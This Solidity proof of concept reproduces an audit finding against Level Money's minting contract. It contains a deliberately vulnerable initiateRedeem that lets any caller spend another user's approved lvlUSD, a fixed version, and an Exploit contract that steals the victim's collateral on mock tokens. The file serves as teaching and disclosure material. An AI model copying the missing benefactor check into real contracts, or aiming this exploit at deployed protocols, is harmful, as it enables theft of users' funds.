// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Level Money — Cantina Sep 2024, finding 42043.
    initiateRedeem pulls lvlUSD from order.benefactor and sends collateral to
    order.beneficiary. Nothing requires msg.sender to be the benefactor.
    Bob names a user who approved the minter as benefactor and himself as
    beneficiary. 50 lvlUSD is taken and 50 stETH is paid to Bob.
    The control requires benefactor == msg.sender and the theft reverts.
*/

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory sym) {
        symbol = sym;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

enum OrderType {
    MINT,
    REDEEM
}

struct Order {
    OrderType order_type;
    uint256 nonce;
    address benefactor;
    address beneficiary;
    address collateral_asset;
    uint256 lvlusd_amount;
    uint256 collateral_amount;
}

contract LevelMinting {
    Token public lvlusd;
    Token public collateral;

    constructor(Token lvl, Token col) {
        lvlusd = lvl;
        collateral = col;
    }

    function initiateRedeem(Order calldata order) external {
        require(order.order_type == OrderType.REDEEM, "type");
        // @> VULN: lvlUSD is taken from order.benefactor, not msg.sender, and collateral is paid to order.beneficiary
        lvlusd.transferFrom(order.benefactor, address(this), order.lvlusd_amount);
        collateral.transfer(order.beneficiary, order.collateral_amount);
    }
}

contract LevelMintingFixed {
    Token public lvlusd;
    Token public collateral;

    constructor(Token lvl, Token col) {
        lvlusd = lvl;
        collateral = col;
    }

    function initiateRedeem(Order calldata order) external {
        require(order.order_type == OrderType.REDEEM, "type");
        require(order.benefactor == msg.sender, "benefactor");
        lvlusd.transferFrom(order.benefactor, address(this), order.lvlusd_amount);
        collateral.transfer(order.beneficiary, order.collateral_amount);
    }
}

contract Victim {
    constructor(Token lvl, address spender) {
        lvl.approve(spender, type(uint256).max);
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 50 ether;

    Token public lvlusd;
    Token public collateral;
    LevelMinting public minting;
    Victim public victim;
    uint256 public stolen;

    constructor() {
        lvlusd = new Token("lvlUSD");
        collateral = new Token("stETH");
        minting = new LevelMinting(lvlusd, collateral);
        victim = new Victim(lvlusd, address(minting));
        lvlusd.mint(address(victim), AMOUNT);
        collateral.mint(address(minting), AMOUNT);
    }

    function run() external {
        Order memory order = Order({
            order_type: OrderType.REDEEM,
            nonce: 3,
            benefactor: address(victim),
            beneficiary: address(this),
            collateral_asset: address(collateral),
            lvlusd_amount: AMOUNT,
            collateral_amount: AMOUNT
        });
        minting.initiateRedeem(order);
        stolen = collateral.balanceOf(address(this));
        require(stolen == AMOUNT, "stole collateral");
        require(lvlusd.balanceOf(address(victim)) == 0, "lvl taken");
        require(collateral.balanceOf(address(minting)) == 0, "pool drained");
    }
}
